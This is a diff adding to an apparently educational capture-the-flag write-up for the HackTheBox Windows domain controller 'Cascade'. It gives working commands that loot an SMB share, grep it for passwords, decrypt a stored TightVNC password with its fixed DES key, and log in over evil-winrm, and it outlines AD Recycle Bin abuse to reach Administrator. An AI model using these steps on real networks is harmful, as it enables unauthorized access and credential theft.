@@ -2,9 +2,9 @@
 
 **OS:** Windows (Server 2008 R2, Domain Controller)
 **Difficulty:** Medium
-**Topics:** Null Session Enumeration, enum4linux, Anonymous LDAP Bind, Custom LDAP Attribute Looting (`cascadeLegacyPwd`), Base64-Encoded Credential Recovery
+**Topics:** Null Session Enumeration, enum4linux, Anonymous LDAP Bind, Custom LDAP Attribute Looting (`cascadeLegacyPwd`), Base64-Encoded Credential Recovery, SMB Share Looting, TightVNC Stored-Password Recovery (fixed-key DES), evil-winrm
 
-> **Status:** This writeup is complete up to **foothold + share enumeration** (recovering `r.thompson`'s credentials from LDAP and listing SMB shares). The rest of the chain (share looting -> `s.smith` -> `arksvc` -> AD Recycle Bin -> root) is outlined under [Next Steps](#next-steps) but was not executed in this run.
+> **Status:** This writeup is complete up to the **`s.smith` user shell + user flag** (foothold via LDAP `cascadeLegacyPwd`, looting the `Data` share, and recovering `s.smith`'s password from a stored TightVNC registry blob). The remaining chain (`Audit$` .NET binary -> `arksvc` -> AD Recycle Bin -> root) is outlined under [Next Steps](#next-steps) but was not executed in this run.
 
 ---
 
@@ -166,12 +166,96 @@ SYSVOL          Disk      Logon server share
 
 ---
 
+## Looting the `Data` share -> `s.smith`
+
+With `r.thompson`'s credentials, connect to the non-standard `Data` share and pull it down recursively instead of browsing file by file:
+
+```bash
+smbclient //10.129.84.52/Data -U 'cascade.local\r.thompson%rY4n5eva' -c 'recurse ON; prompt OFF; mget *'
+```
+
+The useful material lives under an `IT/` tree:
+
+```
+IT/Email Archives/Meeting_Notes_June_2018.html
+IT/Temp/s.smith/VNC Install.reg
+```
+
+Once it's on disk, grep the whole dump for anything credential-ish rather than opening files one at a time:
+
+```bash
+grep -rni "password" ~/htb/cascade 2>/dev/null
+```
+
+Two hits matter.
+
+**1. `Meeting_Notes_June_2018.html`** - references a temporary account whose password matches the real admin's:
+
+```
+Username is TempAdmin (password is the same as the normal admin account password)
+```
+
+> This is a breadcrumb for the **final** root step, not for now. It tells you that recovering `TempAdmin`'s password later - it's a *deleted* object sitting in the AD Recycle Bin - hands you the Administrator password. Park it and keep moving.
+
+**2. `VNC Install.reg`** - a TightVNC server config exported to the registry, carrying a stored password:
+
+```
+[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
+"UseVncAuthentication"=dword:00000001
+"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
+```
+
+### Recovering the TightVNC password
+
+VNC does **not** hash its stored password - it DES-encrypts it with a **fixed, publicly known key** (`e84ad660c4721ae0`). This is obfuscation, not encryption you can't reverse: anyone who reads the blob recovers the cleartext. Strip the commas from the hex and decrypt it:
+
+```bash
+python3 -c '
+from Crypto.Cipher import DES
+enc = bytes.fromhex("6bcf2a4b6e5aca0f")      # the "Password"=hex bytes, commas removed
+key = bytes.fromhex("e84ad660c4721ae0")      # VNC fixed DES key
+print(DES.new(key, DES.MODE_ECB).decrypt(enc))
+'
+# -> b'sT333ve2'
+```
+
+`pip install pycryptodome` first if the `Crypto` module is missing. Or use the dedicated tool:
+
+```bash
+git clone https://github.com/jeroennijhof/vncpwd && (cd vncpwd && make)
+echo -n -e '\x6b\xcf\x2a\x4b\x6e\x5a\xca\x0f' > vncpass.bin
+./vncpwd/vncpwd vncpass.bin
+```
+
+Either route gives the password: **`sT333ve2`**.
+
+### Shell as `s.smith`
+
+Unlike `r.thompson`, `s.smith` **is** a member of `Remote Management Users`, so WinRM works directly for this account:
+
+```bash
+evil-winrm -i 10.129.84.52 -u s.smith -p 'sT333ve2'
+```
+
+```powershell
+type C:\Users\s.smith\Desktop\user.txt
+```
+
+User flag captured.
+
+---
+
 ## Next Steps
 
 *Not executed in this run - documented as the intended path for when I continue the box.*
 
-- **Loot the `Data` and `Audit$` shares** for material (notes, a config, a DB/exe) that leaks the next account, expected to lead toward `s.smith`. Connect with `smbclient //10.129.84.52/Data -U 'cascade.local\r.thompson%rY4n5eva'` and pull everything (`recurse ON; prompt OFF; mget *`).
-- **Pivot to `arksvc`**, which LDAP showed is a member of `CN=AD Recycle Bin` and `CN=Remote Management Users` - the Recycle Bin membership is the key to recovering deleted objects (and a higher-priv credential) via `Get-ADObject -IncludeDeletedObjects`.
+- **Loot the `Audit$` share as `s.smith`.** It holds a custom .NET tool (`CascAudit.exe`) and a SQLite database (`Audit.db`). Decompile the exe (ILSpy / dnSpy) to recover the **hardcoded AES key + IV** it uses to decrypt a password column in the DB - that yields `arksvc`'s credentials.
+- **Pivot to `arksvc`** (also in `Remote Management Users`): `evil-winrm` in, then abuse its **`AD Recycle Bin`** membership to read deleted objects:
+  ```powershell
+  Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties *
+  ```
+  The deleted **`TempAdmin`** object carries a `cascadeLegacyPwd` - Base64-decode it to get the Administrator password (the Meeting Notes breadcrumb from the `Data` share pays off here).
+- **Own the DC** as Administrator over WinRM and grab `root.txt`.
 
 ---
 
@@ -187,6 +271,9 @@ SYSVOL          Disk      Logon server share
 | Foothold | Base64-decode the stored password (`rY4n5eva`) | base64 |
 | Verify | Confirm creds over SMB | NetExec (nxc) |
 | Share enum | List shares; spot non-standard `Data` + `Audit$` | smbclient |
+| Loot | Recursively download `Data`, grep the dump for secrets | smbclient + grep |
+| Cred recovery | Decrypt stored TightVNC password (fixed-key DES) | pycryptodome / vncpwd |
+| User shell | WinRM as `s.smith` -> user flag | evil-winrm |
 
 ---
 
@@ -197,3 +284,6 @@ SYSVOL          Disk      Logon server share
 - **Dump first, filter second.** You don't magically know to grep for `cascadeLegacyPwd`; you dump the whole directory to a file, read it, notice the oddity, then write a targeted `(attr=*)` filter to pull it cleanly.
 - **Base64 is not encryption.** A `=`-padded string in a password-ish field is almost always Base64 - `base64 -d` it before assuming it's a hash.
 - **Don't online-bruteforce AD accounts.** A DC has a lockout policy; rockyou against one user locks it fast. If you must guess online, *spray* (one password, many users) and check `getdompwinfo` first. Here, LDAP made guessing unnecessary entirely.
+- **Stored VNC passwords are reversible, not hashed.** TightVNC/RealVNC/UltraVNC store the server password DES-encrypted under a *fixed* key (`e84ad660c4721ae0`). A `"Password"=hex:...` under an `HKLM\...\VNC` key - or an 8-byte blob in a `.reg`/`.ini`/`.vnc` file - is instantly recoverable with `vncpwd` or an 8-line DES decrypt. Same lesson as Base64: obfuscation is not encryption you can't reverse.
+- **After downloading a share, grep it - don't browse it.** `grep -rniE "pass|pwd|secret|cred" <loot_dir>` surfaces credentials across notes, configs, scripts and exported registry files in a single pass, far faster than opening files by hand.
+- **Not every secret is for right now.** The Meeting Notes `TempAdmin` hint is useless at foothold and decisive at root. Note breadcrumbs, map each to the account it unlocks, and come back to it when you're in range.
